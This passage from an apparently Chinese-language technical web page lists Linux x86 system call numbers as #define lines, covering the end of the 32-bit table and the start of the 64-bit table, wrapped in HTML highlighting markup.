class="line">        <span class="comment">#define __NR_delete_module 129</span></span><br><span class="line">        <span class="comment">#define __NR_get_kernel_syms 130</span></span><br><span class="line">        <span class="comment">#define __NR_quotactl 131</span></span><br><span class="line">        <span class="comment">#define __NR_getpgid 132</span></span><br><span class="line">        <span class="comment">#define __NR_fchdir 133</span></span><br><span class="line">        <span class="comment">#define __NR_bdflush 134</span></span><br><span class="line">        <span class="comment">#define __NR_sysfs 135</span></span><br><span class="line">        <span class="comment">#define __NR_personality 136</span></span><br><span class="line">        <span class="comment">#define __NR_afs_syscall 137</span></span><br><span class="line">        <span class="comment">#define __NR_setfsuid 138</span></span><br><span class="line">        <span class="comment">#define __NR_setfsgid 139</span></span><br><span class="line">        <span class="comment">#define __NR__llseek 140</span></span><br><span class="line">        <span class="comment">#define __NR_getdents 141</span></span><br><span class="line">        <span class="comment">#define __NR__newselect 142</span></span><br><span class="line">        <span class="comment">#define __NR_flock 143</span></span><br><span class="line">        <span class="comment">#define __NR_msync 144</span></span><br><span class="line">        <span class="comment">#define __NR_readv 145</span></span><br><span class="line">        <span class="comment">#define __NR_writev 146</span></span><br><span class="line">        <span class="comment">#define __NR_getsid 147</span></span><br><span class="line">        <span class="comment">#define __NR_fdatasync 148</span></span><br><span class="line">        <span class="comment">#define __NR__sysctl 149</span></span><br><span class="line">        <span class="comment">#define __NR_mlock 150</span></span><br><span class="line">        <span class="comment">#define __NR_munlock 151</span></span><br><span class="line">        <span class="comment">#define __NR_mlockall 152</span></span><br><span class="line">        <span class="comment">#define __NR_munlockall 153</span></span><br><span class="line">        <span class="comment">#define __NR_sched_setparam 154</span></span><br><span class="line">        <span class="comment">#define __NR_sched_getparam 155</span></span><br><span class="line">        <span class="comment">#define __NR_sched_setscheduler 156</span></span><br><span class="line">        <span class="comment">#define __NR_sched_getscheduler 157</span></span><br><span class="line">        <span class="comment">#define __NR_sched_yield 158</span></span><br><span class="line">        <span class="comment">#define __NR_sched_get_priority_max 159</span></span><br><span class="line">        <span class="comment">#define __NR_sched_get_priority_min 160</span></span><br><span class="line">        <span class="comment">#define __NR_sched_rr_get_interval 161</span></span><br><span class="line">        <span class="comment">#define __NR_nanosleep 162</span></span><br><span class="line">        <span class="comment">#define __NR_mremap 163</span></span><br><span class="line">        <span class="comment">#define __NR_setresuid 164</span></span><br><span class="line">        <span class="comment">#define __NR_getresuid 165</span></span><br><span class="line">        <span class="comment">#define __NR_vm86 166</span></span><br><span class="line">        <span class="comment">#define __NR_query_module 167</span></span><br><span class="line">        <span class="comment">#define __NR_poll 168</span></span><br><span class="line">        <span class="comment">#define __NR_nfsservctl 169</span></span><br><span class="line">        <span class="comment">#define __NR_setresgid 170</span></span><br><span class="line">        <span class="comment">#define __NR_getresgid 171</span></span><br><span class="line">        <span class="comment">#define __NR_prctl 172</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigreturn 173</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigaction 174</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigprocmask 175</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigpending 176</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigtimedwait 177</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigqueueinfo 178</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigsuspend 179</span></span><br><span class="line">        <span class="comment">#define __NR_pread64 180</span></span><br><span class="line">        <span class="comment">#define __NR_pwrite64 181</span></span><br><span class="line">        <span class="comment">#define __NR_chown 182</span></span><br><span class="line">        <span class="comment">#define __NR_getcwd 183</span></span><br><span class="line">        <span class="comment">#define __NR_capget 184</span></span><br><span class="line">        <span class="comment">#define __NR_capset 185</span></span><br><span class="line">        <span class="comment">#define __NR_sigaltstack 186</span></span><br><span class="line">        <span class="comment">#define __NR_sendfile 187</span></span><br><span class="line">        <span class="comment">#define __NR_getpmsg 188</span></span><br><span class="line">        <span class="comment">#define __NR_putpmsg 189</span></span><br><span class="line">        <span class="comment">#define __NR_vfork 190</span></span><br><span class="line">        <span class="comment">#define __NR_ugetrlimit 191</span></span><br><span class="line">        <span class="comment">#define __NR_mmap2 192</span></span><br><span class="line">        <span class="comment">#define __NR_truncate64 193</span></span><br><span class="line">        <span class="comment">#define __NR_ftruncate64 194</span></span><br><span class="line">        <span class="comment">#define __NR_stat64 195</span></span><br><span class="line">        <span class="comment">#define __NR_lstat64 196</span></span><br><span class="line">        <span class="comment">#define __NR_fstat64 197</span></span><br><span class="line">        <span class="comment">#define __NR_lchown32 198</span></span><br><span class="line">        <span class="comment">#define __NR_getuid32 199</span></span><br><span class="line">        <span class="comment">#define __NR_getgid32 200</span></span><br><span class="line">        <span class="comment">#define __NR_geteuid32 201</span></span><br><span class="line">        <span class="comment">#define __NR_getegid32 202</span></span><br><span class="line">        <span class="comment">#define __NR_setreuid32 203</span></span><br><span class="line">        <span class="comment">#define __NR_setregid32 204</span></span><br><span class="line">        <span class="comment">#define __NR_getgroups32 205</span></span><br><span class="line">        <span class="comment">#define __NR_setgroups32 206</span></span><br><span class="line">        <span class="comment">#define __NR_fchown32 207</span></span><br><span class="line">        <span class="comment">#define __NR_setresuid32 208</span></span><br><span class="line">        <span class="comment">#define __NR_getresuid32 209</span></span><br><span class="line">        <span class="comment">#define __NR_setresgid32 210</span></span><br><span class="line">        <span class="comment">#define __NR_getresgid32 211</span></span><br><span class="line">        <span class="comment">#define __NR_chown32 212</span></span><br><span class="line">        <span class="comment">#define __NR_setuid32 213</span></span><br><span class="line">        <span class="comment">#define __NR_setgid32 214</span></span><br><span class="line">        <span class="comment">#define __NR_setfsuid32 215</span></span><br><span class="line">        <span class="comment">#define __NR_setfsgid32 216</span></span><br><span class="line">        <span class="comment">#define __NR_pivot_root 217</span></span><br><span class="line">        <span class="comment">#define __NR_mincore 218</span></span><br><span class="line">        <span class="comment">#define __NR_madvise 219</span></span><br><span class="line">        <span class="comment">#define __NR_getdents64 220</span></span><br><span class="line">        <span class="comment">#define __NR_fcntl64 221</span></span><br><span class="line">        <span class="comment">#define __NR_gettid 224</span></span><br><span class="line">        <span class="comment">#define __NR_readahead 225</span></span><br><span class="line">        <span class="comment">#define __NR_setxattr 226</span></span><br><span class="line">        <span class="comment">#define __NR_lsetxattr 227</span></span><br><span class="line">        <span class="comment">#define __NR_fsetxattr 228</span></span><br><span class="line">        <span class="comment">#define __NR_getxattr 229</span></span><br><span class="line">        <span class="comment">#define __NR_lgetxattr 230</span></span><br><span class="line">        <span class="comment">#define __NR_fgetxattr 231</span></span><br><span class="line">        <span class="comment">#define __NR_listxattr 232</span></span><br><span class="line">        <span class="comment">#define __NR_llistxattr 233</span></span><br><span class="line">        <span class="comment">#define __NR_flistxattr 234</span></span><br><span class="line">        <span class="comment">#define __NR_removexattr 235</span></span><br><span class="line">        <span class="comment">#define __NR_lremovexattr 236</span></span><br><span class="line">        <span class="comment">#define __NR_fremovexattr 237</span></span><br><span class="line">        <span class="comment">#define __NR_tkill 238</span></span><br><span class="line">        <span class="comment">#define __NR_sendfile64 239</span></span><br><span class="line">        <span class="comment">#define __NR_futex 240</span></span><br><span class="line">        <span class="comment">#define __NR_sched_setaffinity 241</span></span><br><span class="line">        <span class="comment">#define __NR_sched_getaffinity 242</span></span><br><span class="line">        <span class="comment">#define __NR_set_thread_area 243</span></span><br><span class="line">        <span class="comment">#define __NR_get_thread_area 244</span></span><br><span class="line">        <span class="comment">#define __NR_io_setup 245</span></span><br><span class="line">        <span class="comment">#define __NR_io_destroy 246</span></span><br><span class="line">        <span class="comment">#define __NR_io_getevents 247</span></span><br><span class="line">        <span class="comment">#define __NR_io_submit 248</span></span><br><span class="line">        <span class="comment">#define __NR_io_cancel 249</span></span><br><span class="line">        <span class="comment">#define __NR_fadvise64 250</span></span><br><span class="line">        <span class="comment">#define __NR_exit_group 252</span></span><br><span class="line">        <span class="comment">#define __NR_lookup_dcookie 253</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_create 254</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_ctl 255</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_wait 256</span></span><br><span class="line">        <span class="comment">#define __NR_remap_file_pages 257</span></span><br><span class="line">        <span class="comment">#define __NR_set_tid_address 258</span></span><br><span class="line">        <span class="comment">#define __NR_timer_create 259</span></span><br><span class="line">        <span class="comment">#define __NR_timer_settime 260</span></span><br><span class="line">        <span class="comment">#define __NR_timer_gettime 261</span></span><br><span class="line">        <span class="comment">#define __NR_timer_getoverrun 262</span></span><br><span class="line">        <span class="comment">#define __NR_timer_delete 263</span></span><br><span class="line">        <span class="comment">#define __NR_clock_settime 264</span></span><br><span class="line">        <span class="comment">#define __NR_clock_gettime 265</span></span><br><span class="line">        <span class="comment">#define __NR_clock_getres 266</span></span><br><span class="line">        <span class="comment">#define __NR_clock_nanosleep 267</span></span><br><span class="line">        <span class="comment">#define __NR_statfs64 268</span></span><br><span class="line">        <span class="comment">#define __NR_fstatfs64 269</span></span><br><span class="line">        <span class="comment">#define __NR_tgkill 270</span></span><br><span class="line">        <span class="comment">#define __NR_utimes 271</span></span><br><span class="line">        <span class="comment">#define __NR_fadvise64_64 272</span></span><br><span class="line">        <span class="comment">#define __NR_vserver 273</span></span><br><span class="line">        <span class="comment">#define __NR_mbind 274</span></span><br><span class="line">        <span class="comment">#define __NR_get_mempolicy 275</span></span><br><span class="line">        <span class="comment">#define __NR_set_mempolicy 276</span></span><br><span class="line">        <span class="comment">#define __NR_mq_open 277</span></span><br><span class="line">        <span class="comment">#define __NR_mq_unlink 278</span></span><br><span class="line">        <span class="comment">#define __NR_mq_timedsend 279</span></span><br><span class="line">        <span class="comment">#define __NR_mq_timedreceive 280</span></span><br><span class="line">        <span class="comment">#define __NR_mq_notify 281</span></span><br><span class="line">        <span class="comment">#define __NR_mq_getsetattr 282</span></span><br><span class="line">        <span class="comment">#define __NR_kexec_load 283</span></span><br><span class="line">        <span class="comment">#define __NR_waitid 284</span></span><br><span class="line">        <span class="comment">#define __NR_add_key 286</span></span><br><span class="line">        <span class="comment">#define __NR_request_key 287</span></span><br><span class="line">        <span class="comment">#define __NR_keyctl 288</span></span><br><span class="line">        <span class="comment">#define __NR_ioprio_set 289</span></span><br><span class="line">        <span class="comment">#define __NR_ioprio_get 290</span></span><br><span class="line">        <span class="comment">#define __NR_inotify_init 291</span></span><br><span class="line">        <span class="comment">#define __NR_inotify_add_watch 292</span></span><br><span class="line">        <span class="comment">#define __NR_inotify_rm_watch 293</span></span><br><span class="line">        <span class="comment">#define __NR_migrate_pages 294</span></span><br><span class="line">        <span class="comment">#define __NR_openat 295</span></span><br><span class="line">        <span class="comment">#define __NR_mkdirat 296</span></span><br><span class="line">        <span class="comment">#define __NR_mknodat 297</span></span><br><span class="line">        <span class="comment">#define __NR_fchownat 298</span></span><br><span class="line">        <span class="comment">#define __NR_futimesat 299</span></span><br><span class="line">        <span class="comment">#define __NR_fstatat64 300</span></span><br><span class="line">        <span class="comment">#define __NR_unlinkat 301</span></span><br><span class="line">        <span class="comment">#define __NR_renameat 302</span></span><br><span class="line">        <span class="comment">#define __NR_linkat 303</span></span><br><span class="line">        <span class="comment">#define __NR_symlinkat 304</span></span><br><span class="line">        <span class="comment">#define __NR_readlinkat 305</span></span><br><span class="line">        <span class="comment">#define __NR_fchmodat 306</span></span><br><span class="line">        <span class="comment">#define __NR_faccessat 307</span></span><br><span class="line">        <span class="comment">#define __NR_pselect6 308</span></span><br><span class="line">        <span class="comment">#define __NR_ppoll 309</span></span><br><span class="line">        <span class="comment">#define __NR_unshare 310</span></span><br><span class="line">        <span class="comment">#define __NR_set_robust_list 311</span></span><br><span class="line">        <span class="comment">#define __NR_get_robust_list 312</span></span><br><span class="line">        <span class="comment">#define __NR_splice 313</span></span><br><span class="line">        <span class="comment">#define __NR_sync_file_range 314</span></span><br><span class="line">        <span class="comment">#define __NR_tee 315</span></span><br><span class="line">        <span class="comment">#define __NR_vmsplice 316</span></span><br><span class="line">        <span class="comment">#define __NR_move_pages 317</span></span><br><span class="line">        <span class="comment">#define __NR_getcpu 318</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_pwait 319</span></span><br><span class="line">        <span class="comment">#define __NR_utimensat 320</span></span><br><span class="line">        <span class="comment">#define __NR_signalfd 321</span></span><br><span class="line">        <span class="comment">#define __NR_timerfd_create 322</span></span><br><span class="line">        <span class="comment">#define __NR_eventfd 323</span></span><br><span class="line">        <span class="comment">#define __NR_fallocate 324</span></span><br><span class="line">        <span class="comment">#define __NR_timerfd_settime 325</span></span><br><span class="line">        <span class="comment">#define __NR_timerfd_gettime 326</span></span><br><span class="line">        <span class="comment">#define __NR_signalfd4 327</span></span><br><span class="line">        <span class="comment">#define __NR_eventfd2 328</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_create1 329</span></span><br><span class="line">        <span class="comment">#define __NR_dup3 330</span></span><br><span class="line">        <span class="comment">#define __NR_pipe2 331</span></span><br><span class="line">        <span class="comment">#define __NR_inotify_init1 332</span></span><br><span class="line">        <span class="comment">#define __NR_preadv 333</span></span><br><span class="line">        <span class="comment">#define __NR_pwritev 334</span></span><br><span class="line">        <span class="comment">#define __NR_rt_tgsigqueueinfo 335</span></span><br><span class="line">        <span class="comment">#define __NR_perf_event_open 336</span></span><br><span class="line">        <span class="comment">#define __NR_recvmmsg 337</span></span><br><span class="line">        <span class="comment">#define __NR_fanotify_init 338</span></span><br><span class="line">        <span class="comment">#define __NR_fanotify_mark 339</span></span><br><span class="line">        <span class="comment">#define __NR_prlimit64 340</span></span><br><span class="line">        <span class="comment">#define __NR_name_to_handle_at 341</span></span><br><span class="line">        <span class="comment">#define __NR_open_by_handle_at 342</span></span><br><span class="line">        <span class="comment">#define __NR_clock_adjtime 343</span></span><br><span class="line">        <span class="comment">#define __NR_syncfs 344</span></span><br><span class="line">        <span class="comment">#define __NR_sendmmsg 345</span></span><br><span class="line">        <span class="comment">#define __NR_setns 346</span></span><br><span class="line">        <span class="comment">#define __NR_process_vm_readv 347</span></span><br><span class="line">        <span class="comment">#define __NR_process_vm_writev 348</span></span><br><span class="line">        <span class="comment">#define __NR_kcmp 349</span></span><br><span class="line">        <span class="comment">#define __NR_finit_module 350</span></span><br><span class="line">        <span class="comment">#define __NR_sched_setattr 351</span></span><br><span class="line">        <span class="comment">#define __NR_sched_getattr 352</span></span><br><span class="line">        <span class="comment">#define __NR_renameat2 353</span></span><br><span class="line">        <span class="comment">#define __NR_seccomp 354</span></span><br><span class="line">        <span class="comment">#define __NR_getrandom 355</span></span><br><span class="line">        <span class="comment">#define __NR_memfd_create 356</span></span><br><span class="line">        <span class="comment">#define __NR_bpf 357</span></span><br><span class="line">        <span class="comment">#define __NR_execveat 358</span></span><br><span class="line">        <span class="comment">#define __NR_socket 359</span></span><br><span class="line">        <span class="comment">#define __NR_socketpair 360</span></span><br><span class="line">        <span class="comment">#define __NR_bind 361</span></span><br><span class="line">        <span class="comment">#define __NR_connect 362</span></span><br><span class="line">        <span class="comment">#define __NR_listen 363</span></span><br><span class="line">        <span class="comment">#define __NR_accept4 364</span></span><br><span class="line">        <span class="comment">#define __NR_getsockopt 365</span></span><br><span class="line">        <span class="comment">#define __NR_setsockopt 366</span></span><br><span class="line">        <span class="comment">#define __NR_getsockname 367</span></span><br><span class="line">        <span class="comment">#define __NR_getpeername 368</span></span><br><span class="line">        <span class="comment">#define __NR_sendto 369</span></span><br><span class="line">        <span class="comment">#define __NR_sendmsg 370</span></span><br><span class="line">        <span class="comment">#define __NR_recvfrom 371</span></span><br><span class="line">        <span class="comment">#define __NR_recvmsg 372</span></span><br><span class="line">        <span class="comment">#define __NR_shutdown 373</span></span><br><span class="line">        <span class="comment">#define __NR_userfaultfd 374</span></span><br><span class="line">        <span class="comment">#define __NR_membarrier 375</span></span><br><span class="line">        <span class="comment">#define __NR_mlock2 376</span></span><br><span class="line">        <span class="comment">#define __NR_copy_file_range 377</span></span><br><span class="line">        <span class="comment">#define __NR_preadv2 378</span></span><br><span class="line">        <span class="comment">#define __NR_pwritev2 379</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#endif /* _ASM_X86_UNISTD_32_H */</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        64位：</span><br><span class="line">        <span class="comment">#ifndef _ASM_X86_UNISTD_64_H</span></span><br><span class="line">        <span class="comment">#define _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line">        <span class="comment">#define __NR_read 0</span></span><br><span class="line">        <span class="comment">#define __NR_write 1</span></span><br><span class="line">        <span class="comment">#define __NR_open 2</span></span><br><span class="line">        <span class="comment">#define __NR_close 3</span></span><br><span class="line">        <span class="comment">#define __NR_stat 4</span></span><br><span class="line">        <span class="comment">#define __NR_fstat 5</span></span><br><span class="line">        <span class="comment">#define __NR_lstat 6</span></span><br><span class="line">        <span class="comment">#define __NR_poll 7</span></span><br><span class="line">        <span class="comment">#define __NR_lseek 8</span></span><br><span class="line">        <span class="comment">#define __NR_mmap 9</span></span><br><span class="line">        <span class="comment">#define __NR_mprotect 10</span></span><br><span class="line">        <span class="comment">#define __NR_munmap 11</span></span><br><span class="line">        <span class="comment">#define __NR_brk 12</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigaction 13</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigprocmask 14</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigreturn 15</span></span><br><span class="line">        <span class="comment">#define __NR_ioctl 16</span></span><br><span class="line">        <span class="comment">#define __NR_pread64 17</span></span><br><span class="line">        <span class="comment">#define __NR_pwrite64 18</span></span><br><span class="line">        <span class="comment">#define __NR_readv 19</span></span><br><span class="line">        <span class="comment">#define __NR_writev 20</span></span><br><span class="line">        <span class="comment">#define __NR_access 21</span></span><br><span class="line">        <span class="comment">#define __NR_pipe 22</span></span><br><span class="line">        <span class="comment">#define __NR_select 23</span></span><br><span class="line">        <span class="comment">#define __NR_sched_yield 24</span></span><br><span class="line">        <span class="comment">#define __NR_mremap 25</span></span><br><span class="line">        <span class="comment">#define __NR_msync 26</span></span><br><span class="line">        <span class="comment">#define __NR_mincore 27</span></span><br><span class="line">        <span class="comment">#define __NR_madvise 28</span></span><br><span class="line">        <span class="comment">#define __NR_shmget 29</span></span><br><span class="line">        <span class="comment">#define __NR_shmat 30</span></span><br><span class="line">        <span class="comment">#define __NR_shmctl 31</span></span><br><span class="line">        <span class="comment">#define __NR_dup 32</span></span><br><span class="line">        <span class="comment">#define __NR_dup2 33</span></span><br><span class="line">        <span class="comment">#define __NR_pause 34</span></span><br><span class="line">        <span class="comment">#define __NR_nanosleep 35</span></span><br><span class="line">        <span class="comment">#define __NR_getitimer 36</span></span><br><span class="line">        <span class="comment">#define __NR_alarm 37</span></span><br><span class="line">        <span class="comment">#define __NR_setitimer 38</span></span><br><span class="line">        <span class="comment">#define __NR_getpid 39</span></span><br><span class="line">        <span class="comment">#define __NR_sendfile 40</span></span><br><span class="line">        <span class="comment">#define __NR_socket 41</span></span><br><span class="line">        <span class="comment">#define __NR_connect 42</span></span><br><span class="line">        <span class="comment">#define __NR_accept 43</span></span><br><span class="line">        <span class="comment">#define __NR_sendto 44</span></span><br><span class="line">        <span class="comment">#define __NR_recvfrom 45</span></span><br><span class="line">        <span class="comment">#define __NR_sendmsg 46</span></span><br><span class="line">        <span class="comment">#define __NR_recvmsg 47</span></span><br><span class="line">        <span class="comment">#define __NR_shutdown 48</span></span><br><span class="line">        <span class="comment">#define __NR_bind 49</span></span><br><span class="line">        <span class="comment">#define __NR_listen 50</span></span><br><span class="line">        <span class="comment">#define __NR_getsockname 51</span></span><br><span class="line">        <span class="comment">#define __NR_getpeername 52</span></span><br><span class="line">        <span class="comment">#define __NR_socketpair 53</span></span><br><span class="line">        <span class="comment">#define __NR_setsockopt 54</span></span><br><span class="line">        <span class="comment">#define __NR_getsockopt 55</span></span><br><span class="line">        <span class="comment">#define __NR_clone 56</span></span><br><span class="line">        <span class="comment">#define __NR_fork 57</span></span><br><span class="line">        <span class="comment">#define __NR_vfork 58</span></span><br><span class="line">        <span class="comment">#define __NR_execve 59</span></span><br><span class="line">        <span class="comment">#define __NR_exit 60</span></span><br><span class="line">        <span class="comment">#define __NR_wait4 61</span></span><br><span class="line">        <span class="comment">#define __NR_kill 62</span></span><br><span class="line">        <span class="comment">#define __NR_uname 63</span></span><br><span class="line">        <span class="comment">#define __NR_semget 64</span></span><br><span class="line">        <span class="comment">#define __NR_semop 65</span></span><br><span class="line">        <span class="comment">#define __NR_semctl 66</span></span><br><span class="line">        <span class="comment">#define __NR_shmdt 67</span></span><br><span class="line">        <span class="comment">#define __NR_msgget 68</span></span><br><span class="line">        <span class="comment">#define __NR_msgsnd 69</span></span><br><span class="line">        <span class="comment">#define __NR_msgrcv 70</span></span><br><span class="line">        <span class="comment">#define __NR_msgctl 71</span></span><br><span class="line">        <span class="comment">#define __NR_fcntl 72</span></span><br><span class="line">        <span class="comment">#define __NR_flock 73</span></span><br><span class="line">        <span class="comment">#define __NR_fsync 74</span></span><br><span class="line">        <span class="comment">#define __NR_fdatasync 75</span></span><br><span class="line">        <span class="comment">#define __NR_truncate 76</span></span><br><span class="line">        <span class="comment">#define __NR_ftruncate 77</span></span><br><span class="line">        <span class="comment">#define __NR_getdents 78</span></span><br><span class="line">        <span class="comment">#define __NR_getcwd 79</span></span><br><span class="line">        <span class="comment">#define __NR_chdir 80</span></span><br><span class="line">        <span class="comment">#define __NR_fchdir 81</span></span><br><span class="line">        <span class="comment">#define __NR_rename 82</span></span><br><span class="line">        <span class="comment">#define __NR_mkdir 83</span></span><br><span class="line">        <span class="comment">#define __NR_rmdir 84</span></span><br><span class="line">        <span class="comment">#define __NR_creat 85</span></span><br><span class="line">        <span class="comment">#define __NR_link 86</span></span><br><span class="line">        <span class="comment">#define __NR_unlink 87</span></span><br><span class="line">        <span class="comment">#define __NR_symlink 88</span></span><br><span class="line">        <span class="comment">#define __NR_readlink 89</span></span><br><span class="line">        <span class="comment">#define __NR_chmod 90</span></span><br><span class="line">        <span class="comment">#define __NR_fchmod 91</span></span><br><span class="line">        <span class="comment">#define __NR_chown 92</span></span><br><span class="line">        <span class="comment">#define __NR_fchown 93</span></span><br><span class="line">        <span class="comment">#define __NR_lchown 94</span></span><br><span class="line">        <span class="comment">#define __NR_umask 95</span></span><br><span class="line">        <span class="comment">#define __NR_gettimeofday 96</span></span><br><span class="line">        <span class="comment">#define __NR_getrlimit 97</span></span><br><span class="line">        <span class="comment">#define __NR_getrusage 98</span></span><br><span class="line">        <span class="comment">#define __NR_sysinfo 99</span></span><br><span class="line">        <span class="comment">#define __NR_times 100</span></span><br><span class="line">        <span class="comment">#define __NR_ptrace 101</span></span><br><span class="line">        <span class="comment">#define __NR_getuid 102</span></span><br><span class="line">        <span class="comment">#define __NR_syslog 103</span></span><br><span class="line">        <span class="comment">#define __NR_getgid 104</span></span><br><span class="line">        <span class="comment">#define __NR_setuid 105</span></span><br><span class="line">        <span class="comment">#define __NR_setgid 106</span></span><br><span class="line">        <span class="comment">#define __NR_geteuid 107</span></span><br><span class="line">        <span class="comment">#define __NR_getegid 108</span></span><br><span class="line">        <span class="comment">#define __NR_setpgid 109</span></span><br><span class="line">        <span class="comment">#define __NR_getppid 110</span></span><br><span class="line">        <span class="comment">#define __NR_getpgrp 111</span></span><br><span class="line">        <span class="comment">#define __NR_setsid 112</span></span><br><span class="line">        <span class="comment">#define __NR_setreuid 113</span></span><br><span class="line">        <span class="comment">#define __NR_setregid 114</span></span><br><span class="line">        <span class="comment">#define __NR_getgroups 115</span></span><br><span class="line">        <span class="comment">#define __NR_setgroups 116</span></span><br><span class="line">        <span class="comment">#define __NR_setresuid 117</span></span><br><span class="line">        <span class="comment">#define __NR_getresuid 118</span></span><br><span class="line">        <span class="comment">#define __NR_setresgid 119</span></span><br><span class="line">        <span class="comment">#define __NR_getresgid 120</span></span><br><span class="line">        <span class="comment">#define __NR_getpgid 121</span></span><br><span class="line">        <span class="comment">#define __NR_setfsuid 122</span></span><br><span class="line">        <span class="comment">#define __NR_setfsgid 123</span></span><br><span class="line">        <span class="comment">#define __NR_getsid 124</span></span><br><span class="line">        <span class="comment">#define __NR_capget 125</span></span><br><span class="line">        <span class="comment">#define __NR_capset 126</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigpending 127</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigtimedwait 128</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigqueueinfo 129</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigsuspend 130</span></span><br><span class="line">        <span class="comment">#define __NR_sigaltstack 131</span></span><br><span class="line">        <span class="comment">#define __NR_utime 132</span></span><br><span class="line">        <span class="comment">#define __NR_mknod 133</span></span><br><span class="line">        <span class="comment">#define __NR_uselib 134</span></span><br><span class="line">        <span class="comment">#define __NR_personality 135</span></span><br><span class="line">        <span class="comment">#define __NR_ustat 136</span></span><br><span class="line">        <span class="comment">#define __NR_statfs 137</span></span><br><span class="line">        <span class="comment">#define __NR_fstatfs 138</span></span><br><span class="line">        <span class="comment">#define __NR_sysfs 139</span></span><br><span class="line">        <span class="comment">#define __NR_getpriority 140</span></span><br><span class="line">        <span class="comment">#define __NR_setpriority 141</span></span><br><span class="line">        <span class="comment">#define __NR_sched_setparam 142</span></span><br><span class="line">        <span class="comment">#define __NR_sched_getparam 143</span></span><br><span class="line">        <span class="comment">#define __NR_sched_setscheduler 144</span></span><br><span class="line">        <span class="comment">#define __NR_sched_getscheduler 145</span></span><br><span class="line">        <span class="comment">#define __NR_sched_get_priority_max 146</span></span><br><span class="line">        <span class="comment">#define __NR_sched_get_priority_min 147</span></span><br><span class="line">        <span class="comment">#define __NR_sched_rr_get_interval 148</span></span><br><span class="line">        <span class="comment">#define __NR_mlock 149</span></span><br><span class="line">        <span class="comment">#define __NR_munlock 150</span></span><br><span class="line">        <span class="comment">#define __NR_mlockall 151</span></span><br><span class="line">        <span class="comment">#define __NR_munlockall 152</span></span><br><span class="line">        <span class="comment">#define __NR_vhangup 153</span></span><br><span class="line">        <span class="comment">#define __NR_modify_ldt 154</span></span><br><span class="line">        <span class="comment">#define __NR_pivot_root 155</span></span><br><span class="line">        <span class="comment">#define __NR__sysctl 156</span></span><br><span class="line">        <span class="comment">#define __NR_prctl 157</span></span><br><span class="line">        <span class="comment">#define __NR_arch_prctl 158</span></span><br><span class="line">        <span class="comment">#define __NR_adjtimex 159</span></span><br><span class="line">        <span class="comment">#define __NR_setrlimit 160</span></span><br><span class="line">        <span class="comment">#define __NR_chroot 161</span></span><br><span class="line">        <span class="comment">#define __NR_sync 162</span></span><br><span class="line">        <span class="comment">#define __NR_acct 163</span></span><br><span class="line">        <span class="comment">#define __NR_settimeofday 164</span></span><br><span class="line">        <span class="comment">#define __NR_mount 165</span></span><br><span class="line">        <span class="comment">#define __NR_umount2 166</span></span><br><span class="line">        <span class="comment">#define __NR_swapon 167</span></span><br><span class="line">        <span class="comment">#define __NR_swapoff 168</span></span><br><span class="line">        <span class="comment">#define __NR_reboot 169</span></span><br><span class="line">        <span class="comment">#define __NR_sethostname 170</span></span><br><span class="line">        <span class="comment">#define __NR_setdomainname 171</span></span><br><span class="line">        <span class="comment">#define __NR_iopl 172</span></span><br><span class="line">        <span class="comment">#define __NR_ioperm 173</span></span><br><span class="line">        <span class="comment">#define __NR_create_module 174</span></span><br><span class="line">        <span class="comment">#define __NR_init_module 175</span></span><br><span class="line">        <span class="comment">#define __NR_delete_module 176</span></span><br><span class="line">        <span class="comment">#define __NR_get_kernel_syms 177</span></span><br><span class="line">        <span class="comment">#define __NR_query_module 178</span></span><br><span class="line">        <span class="comment">#define __NR_quotactl 179</span></span><br><span class="line">        <span class="comment">#define __NR_nfsservctl 180</span></span><br><span class="line">        <span class="comment">#define __NR_getpmsg 181</span></span><br><span class="line">        <span class="comment">#define __NR_putpmsg 182</span></span><br><span class="line">        <span class="comment">#define __NR_afs_syscall 183</span></span><br><span class="line">        <span class="comment">#define __NR_tuxcall 184</span></span><br><span class="line">        <span class="comment">#define __NR_security 185</span></span><br><span class="line">        <span class="comment">#define __NR_gettid 186</span></span><br><span class="line">        <span class="comment">#define __NR_readahead 187</span></span><br><span class="line">        <span class="comment">#define __NR_setxattr 188</span></span><br><span class="line">        <span class="comment">#define __NR_lsetxattr 189</span></span><br><span class="line">        <span class="comment">#define __NR_fsetxattr 190</span></span><br><span class="line">        <span class="comment">#define __NR_getxattr 191</span></span><br><span class="line">        <span class="comment">#define __NR_lgetxattr 192</span></span><br><span class="line">        <span class="comment">#define __NR_fgetxattr 193</span></span><br><span class="line">        <span class="comment">#define __NR_listxattr 194</span></span><br><span class="line">        <span class="comment">#define __NR_llistxattr 195</span></span><br><span class="line">        <span class="comment">#define __NR_flistxattr 196</span></span><br><span class="line">        <span class="comment">#define __NR_removexattr 197</span></span><br><span class="line">        <span class="comment">#define __NR_lremovexattr 198</span></span><br><span class="line">        <span class="comment">#define __NR_fremovexattr 199</span></span><br><span class="line">        <span class="comment">#define __NR_tkill 200</span></span><br><span class="line">        <span class="comment">#define __NR_time 201</span></span><br><span class="line">        <span class="comment">#define __NR_futex 202</span></span><br><span class="line">        <span class="comment">#define __NR_sched_setaffinity 203</span></span><br><span class="line">        <span class="comment">#define __NR_sched_getaffinity 204</span></span><br><span class="line">        <span class="comment">#define __NR_set_thread_area 205</span></span><br><span class="line">        <span class="comment">#define __NR_io_setup 206</span></span><br><span class="line">        <span class="comment">#define __NR_io_destroy 207</span></span><br><span class="line">        <span class="comment">#define __NR_io_getevents 208</span></span><br><span class="line">        <span class="comment">#define __NR_io_submit 209</span></span><br><span 